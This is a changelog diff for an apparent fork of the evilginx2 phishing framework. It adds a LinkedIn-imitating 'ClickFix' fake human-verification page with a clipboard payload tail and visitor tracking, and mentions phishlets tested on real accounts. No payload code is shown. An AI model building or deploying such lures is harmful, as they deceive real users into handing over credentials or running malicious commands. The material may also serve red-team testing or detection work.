@@ -4,6 +4,18 @@ Forked from [evilginx2 CE 3.3.0](https://github.com/kgretzky/evilginx2) (upstrea
 commit `4c0988a`). Every extension is clean-room (no reference to commercial
 binaries) and verified end-to-end on the two-node lab (Kali + Ubuntu).
 
+## v0.12.0 (2026-09-22) — linkedin clickfix template (unverified)
+
+- **New `linkedin` ClickFix template**, marked **unverified**: LinkedIn-styled
+  verification card — official `in` logo + wordmark (vectorlogo.zone paths),
+  white card (radius 8) on the warm `#f4f2ee` background, 20px title
+  "Verify you are human", bordered checkbox row, LinkedIn-blue `#0a66c2`
+  pill Verify enabling after the random 5–15 s, success state + redirect,
+  silent 30–60 s fallback, footer "This site is protected by LinkedIn
+  verification." Same unified clipboard tail and server-side 4-digit VID as
+  every template. Template gitignored (scp to node); tested via swap and
+  reverted — production stays on `aws-captcha`.
+
 ## v0.11.9 (2026-09-22) — GitHub verified E2E + 6 unverified phishlets
 
 - **GitHub promoted to production-ready**: real-account E2E — password
